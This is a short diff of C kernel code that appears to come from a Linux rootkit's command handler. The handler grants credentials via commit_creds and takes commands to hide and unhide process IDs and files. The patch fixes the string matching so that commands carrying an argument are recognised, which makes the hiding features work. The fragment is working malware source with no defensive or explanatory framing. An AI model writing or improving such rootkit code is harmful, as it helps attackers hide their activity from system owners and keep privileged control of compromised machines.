@@ -778,25 +778,25 @@ int execute_command(const char __user *str, size_t length)
 
         commit_creds(creds);
     }
-    else if (strcmp(str, CFG_HIDE_PID) == 0)
+    else if (strncmp(str, CFG_HIDE_PID,sizeof(CFG_HIDE_PID)) == 0)
     {
         pr_info("Got hide pid command\n");
         str += sizeof(CFG_HIDE_PID);
         pid_add(str);
     }
-    else if (strcmp(str, CFG_UNHIDE_PID) == 0)
+    else if (strncmp(str, CFG_UNHIDE_PID,sizeof(CFG_UNHIDE_PID)) == 0)
     {
         pr_info("Got unhide pid command\n");
         str += sizeof(CFG_UNHIDE_PID);
         pid_remove(str);
     }
-    else if (strcmp(str, CFG_HIDE_FILE) == 0)
+    else if (strncmp(str, CFG_HIDE_FILE,sizeof(CFG_HIDE_FILE)) == 0)
     {
         pr_info("Got hide file command\n");
         str += sizeof(CFG_HIDE_FILE);
         file_add(str);
     }
-    else if (strcmp(str, CFG_UNHIDE_FILE) == 0)
+    else if (strncmp(str, CFG_UNHIDE_FILE, sizeof(CFG_UNHIDE_FILE)) == 0)
     {
         pr_info("Got unhide file command\n");
         str += sizeof(CFG_UNHIDE_FILE);
